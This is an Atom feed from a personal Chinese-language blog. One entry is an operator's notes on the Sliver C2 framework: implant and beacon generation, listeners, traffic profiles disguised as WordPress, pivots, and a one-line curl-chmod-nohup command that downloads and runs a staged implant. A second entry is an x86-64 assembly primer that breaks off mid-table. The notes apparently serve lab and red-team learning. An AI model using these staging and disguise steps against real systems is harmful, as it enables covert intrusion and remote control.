<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>lyi61pd</title>
  
  <subtitle>Blog</subtitle>
  <link href="https://lyi61pd.github.io/atom.xml" rel="self"/>
  
  <link href="https://lyi61pd.github.io/"/>
  <updated>2025-07-30T03:40:55.100Z</updated>
  <id>https://lyi61pd.github.io/</id>
  
  <author>
    <name>lyi61pd</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Sliver</title>
    <link href="https://lyi61pd.github.io/2025/07/30/Sliver/"/>
    <id>https://lyi61pd.github.io/2025/07/30/Sliver/</id>
    <published>2025-07-30T00:00:00.000Z</published>
    <updated>2025-07-30T03:40:55.100Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="运行服务"><a href="#运行服务" class="headerlink" title="运行服务"></a>运行服务</h2><blockquote><p>虽然官方文档没提到，但是实际使用下来发现，sliver-server需要root权限，否则没法监听端口，如果使用多用户模式的话，只需要sliver-server使用root权限，sliver-client只需要普通用户权限即可</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 正常进入sliver-server的交互式命令行界面</span><br><span class="line">sliver-server</span><br><span class="line"></span><br><span class="line"># 后台跑sliver-server，适用于需要多用户的情况下，但是要先生成用户的配置文件</span><br><span class="line">sliver-server daemon</span><br></pre></td></tr></table></figure><h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># 生成session</span><br><span class="line">generate -b localhost --os linux --skip-symbols --debug -s temp/</span><br><span class="line"></span><br><span class="line"># 生成beacon</span><br><span class="line">generate beacon -b localhost --skip-symbols --debug -j 1 -S 5 --os linux</span><br><span class="line"></span><br><span class="line"># 查看生成的beacon和session</span><br><span class="line">implants</span><br><span class="line"></span><br><span class="line"># 启动http监听</span><br><span class="line">http</span><br><span class="line"></span><br><span class="line"># 查看正在监听的服务</span><br><span class="line">jobs</span><br><span class="line"></span><br><span class="line"># 查看已经拿到的session</span><br><span class="line">sessions</span><br><span class="line"></span><br><span class="line"># 查看已经拿到的beacon</span><br><span class="line">beacons</span><br><span class="line"></span><br><span class="line"># 进入某个目标进行交互</span><br><span class="line">use</span><br><span class="line"></span><br><span class="line"># 退出server</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line"># 查看某个目标的信息</span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"># 查看某个beacon的响应时间信息</span><br><span class="line">beacons watch</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="交互命令"><a href="#交互命令" class="headerlink" title="交互命令"></a>交互命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># 查看目标基础信息</span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"># 进入shell</span><br><span class="line">shell</span><br><span class="line"></span><br><span class="line"># 退出</span><br><span class="line">background</span><br><span class="line"></span><br><span class="line"># 基础的文件操作、目录，通过help命令查询</span><br><span class="line">ls</span><br><span class="line">pwd</span><br><span class="line">cd</span><br><span class="line">mv .....</span><br><span class="line"></span><br><span class="line"># 设置beacon的响应时间和抖动时间</span><br><span class="line">reconfig -i 3s -j 1s</span><br><span class="line"></span><br><span class="line"># 查看beacon的命令执行状态</span><br><span class="line">tasks</span><br><span class="line"></span><br><span class="line"># 查看beacon的某个命令执行结果</span><br><span class="line">tasks fetch</span><br><span class="line"></span><br><span class="line"># 在beacon上创建一个新的同名session连接，是在当前beacon中创建了一个goroutine线程跑session</span><br><span class="line">interactive</span><br><span class="line"></span><br><span class="line"># 启动socks5，只能在session中跑，socks5代理还不清楚怎么用，端口是在server端还是target端，需要再试试看</span><br><span class="line">socks5 start</span><br><span class="line"></span><br><span class="line"># 查看当前socks5列表</span><br><span class="line">socks5</span><br><span class="line"></span><br><span class="line"># 关闭指定socks5，需要指定id</span><br><span class="line">socks5 stop -i 1</span><br><span class="line"></span><br><span class="line"># 关停session连接，不能关beacon，并且也不是完全关，下个轮训会自动连回来</span><br><span class="line">close</span><br></pre></td></tr></table></figure><h2 id="多用户模式"><a href="#多用户模式" class="headerlink" title="多用户模式"></a>多用户模式</h2><p>服务端，默认是<code>31337**&lt;font style=&quot;color:rgb(255, 255, 255);background-color:rgb(24, 24, 27);&quot;&gt;&lt;/font&gt;**</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new-operator --name lyi --lhost 192.168.1.66 -P all</span><br><span class="line">multiplayer</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sliver-client import lyi_192.168.1.66.cfg</span><br><span class="line">sliver-client</span><br></pre></td></tr></table></figure><p>一般情况建议服务端配置system服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Sliver</span><br><span class="line">After=network.target</span><br><span class="line">StartLimitIntervalSec=0</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartSec=3</span><br><span class="line">User=root</span><br><span class="line">ExecStart=/usr/bin/sliver-server daemon</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>一行命令进行配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sudo tee /etc/systemd/system/sliver-server.service &gt; /dev/null &lt;&lt; &#x27;EOF&#x27;</span><br><span class="line">[Unit]</span><br><span class="line">Description=Sliver</span><br><span class="line">After=network.target</span><br><span class="line">StartLimitIntervalSec=0</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartSec=3</span><br><span class="line">User=root</span><br><span class="line">ExecStart=/usr/bin/sliver-server daemon</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl enable sliver-server</span><br><span class="line">sudo systemctl start sliver-server</span><br></pre></td></tr></table></figure><p>如果用了<code>multiplayer</code>命令之后，执行<code>sliver-server daemon</code>就会报告端口已占用，这是因为sliver-server已经启用了multiplayer的job，这时候需要通过<code>jobs</code>查看对应的id，然后<code>jobs -k 2</code>来关闭multiplayer，然后就可以正常跑<code>sliver-server daemon</code>了</p><h1 id="C2-Profiles"><a href="#C2-Profiles" class="headerlink" title="C2 Profiles"></a>C2 Profiles</h1><p>下载这个</p><p><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt">https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt</a></p><p>然后依据这个创建c2profiles</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2profiles generate -f urls-wordpress-3.3.1.txt -n wordpress -</span><br></pre></td></tr></table></figure><p>常用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看当前已有的c2profiles</span><br><span class="line">c2profiles</span><br><span class="line"></span><br><span class="line">通过-C在生成beacon时指定c2profile</span><br><span class="line">generate beacon -b localhost --skip-symbols --debug -j 1 -S 5 --os linux -C wordpress</span><br></pre></td></tr></table></figure><h1 id="HTTP-Payload-staging"><a href="#HTTP-Payload-staging" class="headerlink" title="HTTP Payload staging"></a>HTTP Payload staging</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">生成profile</span><br><span class="line">profiles new beacon -b localhost --os linux --skip-symbols --debug profile_test</span><br><span class="line"></span><br><span class="line">根据profile生成implant</span><br><span class="line">profiles generate profile_test</span><br><span class="line"></span><br><span class="line">设置implant对外暴露以便通过http下载</span><br><span class="line">implants stage</span><br></pre></td></tr></table></figure><p>然后通过<code>implants</code>命令查看implant的ID，然后通过curl可以去下载payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost/test.yml?z=14274</span><br></pre></td></tr></table></figure><p>也可以加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">根据profile生成implant，并且加密</span><br><span class="line">profiles stage -c gzip profile_test</span><br></pre></td></tr></table></figure><p>后续的stage实际上就是执行类似这样的操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost/nothingtoseehere.yml?c=14274 --output nothingtoseehere &amp;&amp; chmod u+x nothingtoseehere &amp;&amp; nohup ./nothingtoseehere</span><br></pre></td></tr></table></figure><h1 id="Pivots"><a href="#Pivots" class="headerlink" title="Pivots"></a>Pivots</h1><p>pivots有两种，一种是TCP，另一种是命名管道，TCP适用所有平台，命名管道只能在windows</p><p>首先通过<code>use</code>连接到session，然后执行下面命令创建tcp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pivots tcp</span><br><span class="line"></span><br><span class="line">pivots</span><br></pre></td></tr></table></figure><p>然后<code>background</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generate --tcp-pivot 127.0.0.1 --os linux</span><br></pre></td></tr></table></figure><h1 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h1><p>可以设置简单的自动脚本，但是无法做复杂逻辑，如果要做复杂逻辑，建议还是自己写一个客户端，比如用Python写，然后通过调用服务端的gRPC接口来实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">reaction set -e &quot;session-connected&quot;</span><br><span class="line"></span><br><span class="line">[*] Setting reaction to: Session Opened</span><br><span class="line"></span><br><span class="line">? Enter commands:  [Enter 2 empty lines to finish]pwd</span><br><span class="line">env</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Set reaction to session-connected (id: 1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个设置完后，在有新的session连的时候就会自动触发这个脚本</p><p>可以通过<code>reaction --help</code>命令查看都有哪些触发事件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常用命令&quot;&gt;&lt;a href=&quot;#常用命令&quot; class=&quot;headerlink&quot; title=&quot;常用命令&quot;&gt;&lt;/a&gt;常用命令&lt;/h1&gt;&lt;h2 id=&quot;运行服务&quot;&gt;&lt;a href=&quot;#运行服务&quot; class=&quot;headerlink&quot; title=&quot;运行服务&quot;&gt;&lt;/a</summary>
      
    
    
    
    
    <category term="C2" scheme="https://lyi61pd.github.io/tags/C2/"/>
    
  </entry>
  
  <entry>
    <title>汇编</title>
    <link href="https://lyi61pd.github.io/2025/07/07/%E6%B1%87%E7%BC%96/"/>
    <id>https://lyi61pd.github.io/2025/07/07/%E6%B1%87%E7%BC%96/</id>
    <published>2025-07-07T00:00:00.000Z</published>
    <updated>2025-07-30T03:40:55.101Z</updated>
    
    <content type="html"><![CDATA[<p>针对amd架构的汇编有Intel和AT&amp;T两种语法， 下面的介绍都是以Intel语法为主进行说明，主要是针对的系统是System V ABI，Linux，也是目前主流的情况</p><h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><table><thead><tr><th>名称</th><th>用途简述</th></tr></thead><tbody><tr><td><code>RAX</code></td><td>主累加器（函数返回值）</td></tr><tr><td><code>RBX</code></td><td>基址寄存器</td></tr><tr><td><code>RCX</code></td><td>循环计数、参数寄存器</td></tr><tr><td><code>RDX</code></td><td>乘法&#x2F;除法辅助、参数</td></tr><tr><td><code>RSI</code></td><td>源索引（字符串操作）</td></tr><tr><td><code>RDI</code></td><td>目标索引，函数第一个参数</td></tr><tr><td><code>RBP</code></td><td>栈基址（Base Pointer）</td></tr><tr><td><code>RSP</code></td><td>栈顶指针（Stack Pointer）</td></tr><tr><td><code>R8</code></td><td>新增参数寄存器</td></tr><tr><td><code>R9</code></td><td>新增参数寄存器</td></tr><tr><td><code>R10</code></td><td>通用</td></tr><tr><td><code>R11</code></td><td>通用</td></tr><tr><td><code>R12</code></td><td>通用</td></tr><tr><td><code>R13</code></td><td>通用</td></tr><tr><td><code>R14</code></td><td>通用</td></tr><tr><td><code>R15</code></td><td>通用</td></tr></tbody></table><h2 id="特殊的寄存器"><a href="#特殊的寄存器" class="headerlink" title="特殊的寄存器"></a>特殊的寄存器</h2><table><thead><tr><th>寄存器</th><th>说明</th></tr></thead><tbody><tr><td><code>RIP</code></td><td>指令指针寄存器（程序计数器）</td></tr><tr><td><code>RSP</code></td><td>栈顶指针</td></tr><tr><td><code>RBP</code></td><td>栈帧基址</td></tr><tr><td><code>RFLAGS</code></td><td>状态标志寄存器</td></tr></tbody></table><h2 id="位宽访问"><a href="#位宽访问" class="headerlink" title="位宽访问"></a>位宽访问</h2><p>每个 64 位寄存器都可以访问其低位部分。以 <code>RAX</code> 为例：</p><table><thead><tr><th>位宽</th><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>64位</td><td><code>RAX</code></td><td>全寄存器</td></tr><tr><td>32位</td><td><code>EAX</code></td><td>低 32 位</td></tr><tr><td>16位</td><td><code>AX</code></td><td>低 16 位</td></tr><tr><td>8位高</td><td><code>AH</code></td><td>AX 的高 8 位</td></tr><tr><td>8位低</td><td><code>AL</code></td><td>AX 的低 8 位</td></tr></tbody></table><p>对于 <code>R8</code> ~ <code>R15</code> 等新寄存器：</p><table><thead><tr><th>位宽</th><th>示例</th></tr></thead><tbody><tr><td>64位</td><td><code>R8</code></td></tr><tr><td>32位</td><td><code>R8D</code></td></tr><tr><td>16位</td><td><code>R8W</code></td></tr><tr><td>8位</td><td><code>R8B</code></td></tr></tbody></table><h2 id="函数调用参数传递"><a href="#函数调用参数传递" class="headerlink" title="函数调用参数传递"></a>函数调用参数传递</h2><p>64位Linux中，函数的前 6 个参数通过寄存器传递：</p><table><thead><tr><th>参数位置</th><th>寄存器</th></tr></thead><tbody><tr><td>第1个</td><td><code>RDI</code></td></tr><tr><td>第2个</td><td><code>RSI</code></td></tr><tr><td>第3个</td><td><code>RDX</code></td></tr><tr><td>第4个</td><td><code>RCX</code></td></tr><tr><td>第5个</td><td><code>R8</code></td></tr><tr><td>第6个</td><td><code>R9</code></td></tr><tr><td>返回值</td><td><code>RAX</code></td></tr></tbody></table><p>超出部分通过栈传递（push）</p><h1 id="数据单位"><a href="#数据单位" class="headerlink" title="数据单位"></a>数据单位</h1><table><thead><tr><th>类型</th><th>英文缩写</th><th>位宽</th><th>字节数</th><th>举例值</th></tr></thead><tbody><tr><td>字节</td><td>byte (<code>db</code>)</td><td>8 位</td><td>1 字节</td><td><code>0x7F</code></td></tr><tr><td>字</td><td>word (<code>dw</code>)</td><td>16 位</td><td>2 字节</td><td><code>0x1234</code></td></tr><tr><td>双字</td><td>dword (<code>dd</code>)</td><td>32 位</td><td>4 字节</td><td><code>0x12345678</code></td></tr><tr><td>四字</td><td>qword (<code>dq</code>)</td><td>64 位</td><td>8 字节</td><td><code>0x123456789ABCDEF0</code></td></tr></tbody></table><h1 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h1><p>下面是常见指令，需要注意的是，虽然有很多的“相当于”，但是不代表可以直接代替，比如直接操作<code>rip</code>寄存器是违法操作，要通过<code>jmp</code>、<code>ret</code>这些命令来代替</p><h2 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rax, rbx</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rax = rbx</span><br></pre></td></tr></table></figure><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add rax, rbx</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rax = rax + rbx</span><br></pre></td></tr></table></figure><h2 id="sub"><a href="#sub" class="headerlink" title="sub"></a>sub</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub rax, rbx</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rax = rax - rbx</span><br></pre></td></tr></table></figure><h2 id="inc"><a href="#inc" class="headerlink" title="inc"></a>inc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inc rax</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rax = rax + 1</span><br></pre></td></tr></table></figure><h2 id="dec"><a href="#dec" class="headerlink" title="dec"></a>dec</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dec rax</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rax = rax - 1</span><br></pre></td></tr></table></figure><h2 id="and"><a href="#and" class="headerlink" title="and"></a>and</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and rax, rbx</span><br></pre></td></tr></table></figure><p>相当于对<code>rax</code>和<code>rbx</code>按位与，结果赋值给<code>rax</code></p><h2 id="or"><a href="#or" class="headerlink" title="or"></a>or</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or rax, rbx</span><br></pre></td></tr></table></figure><p>相当于对<code>rax</code>和<code>rbx</code>按位或，结果赋值给<code>rax</code></p><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xor rax, rbx</span><br></pre></td></tr></table></figure><p>相当于对<code>rax</code>和<code>rbx</code>按位异或，结果赋值给<code>rax</code></p><h2 id="not"><a href="#not" class="headerlink" title="not"></a>not</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">not rax</span><br></pre></td></tr></table></figure><p>相当于对<code>rax</code>按位取反，结果赋值给<code>rax</code></p><h2 id="cmp"><a href="#cmp" class="headerlink" title="cmp"></a>cmp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp rax, rbx</span><br></pre></td></tr></table></figure><p>对<code>rax</code>和<code>rbx</code>进行比较，结果会保存到标志位<code>rflags</code>的<code>ZF</code>、<code>SF</code>、<code>CF</code>、<code>OF</code>标志位中</p><h2 id="je"><a href="#je" class="headerlink" title="je"></a>je</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmp rax, rbx</span><br><span class="line">je label</span><br></pre></td></tr></table></figure><p>相当于条件判断<code>rax</code>和<code>rbx</code></p><p>如果相等就执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp label</span><br></pre></td></tr></table></figure><p>其他的还有<code>jne</code>、<code>jg</code>、<code>jl</code></p><h2 id="leave"><a href="#leave" class="headerlink" title="leave"></a>leave</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rsp, rbp</span><br><span class="line">pop rbp</span><br></pre></td></tr></table></figure><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 60</span><br><span class="line">mov rdi, 0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit(0)</span><br></pre></td></tr></table></figure><p>这里<code>exit</code>是系统调用，对应系统调用号为60，通过<code>rax</code>来记录，然后需要的参数通过<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>….这些来传</p><h2 id="push"><a href="#push" class="headerlink" title="push"></a>push</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push rax</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub rsp, 8</span><br><span class="line">mov [rsp], rax</span><br></pre></td></tr></table></figure><p><code>mov [rsp]， rax</code>表示把<code>rax</code>的值写入<code>rsp</code>的值指向的地址处</p><h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rax</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax, [rsp]</span><br><span class="line">add rsp, 8</span><br></pre></td></tr></table></figure><p>这里<code>mov rax, [rsp]</code>表示把<code>rsp</code>栈顶指针指向地址处的值给取出来，然后赋值给<code>rax</code></p><h2 id="jmp"><a href="#jmp" class="headerlink" title="jmp"></a>jmp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp label</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rip, address of label</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp rax</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rip, rax</span><br></pre></td></tr></table></figure><h2 id="cmp-1"><a href="#cmp-1" class="headerlink" title="cmp"></a>cmp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp rax,</span><br></pre></td></tr></table></figure><h2 id="call"><a href="#call" class="headerlink" title="call"></a>call</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call my_function</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push rip</span><br><span class="line">jmp my_function</span><br></pre></td></tr></table></figure><h2 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br></pre></td></tr></table></figure><p>也会见到<code>retn</code>，跟<code>ret</code>等价</p><h2 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h2><p>用于计算地址的（设计上是这样的目的，当然功能很强大所以也可以单纯拿来算东西）</p><p>能接受的数据格式是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[base + index*scale + displacement]</span><br></pre></td></tr></table></figure><p>所以这些是不允许的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lea eax, [ecx * 3]     ; 错误，scale 只能是 1/2/4/8</span><br><span class="line">lea eax, [ecx + edx + ebx] ; 错误，最多只能加两个寄存器（base + index）</span><br></pre></td></tr></table></figure><p>主要用法包括这些</p><table><thead><tr><th>用法类型</th><th>示例</th></tr></thead><tbody><tr><td>地址计算</td><td><code>lea eax, [ebx+4]</code></td></tr><tr><td>数学计算</td><td><code>lea eax, [ecx*2 + 8]</code></td></tr><tr><td>获取数组元素地址</td><td><code>lea eax, [array + index * 元素大小]</code></td></tr><tr><td>获取结构体成员地址</td><td><code>lea eax, [esi + 偏移]</code></td></tr></tbody></table><p>当然LEA 不只用于地址，还可以这样</p><table><thead><tr><th>用法类别</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td>地址计算</td><td><code>lea eax, [esi + edi*4 + 8]</code></td><td>典型场景：结构体&#x2F;数组元素地址计算</td></tr><tr><td>代替加法</td><td><code>lea eax, [ebx + 10]</code></td><td>等效于：<code>add eax, 10</code></td></tr><tr><td>代替乘法</td><td><code>lea eax, [ecx*2]</code></td><td>等效于：<code>eax = ecx * 2</code></td></tr><tr><td>代替组合计算</td><td><code>lea eax, [ebx + ecx*4 + 16]</code></td><td>等效于：<code>eax = ebx + ecx * 4 + 16</code></td></tr><tr><td>变相实现 <code>imul</code></td><td><code>lea eax, [ecx + 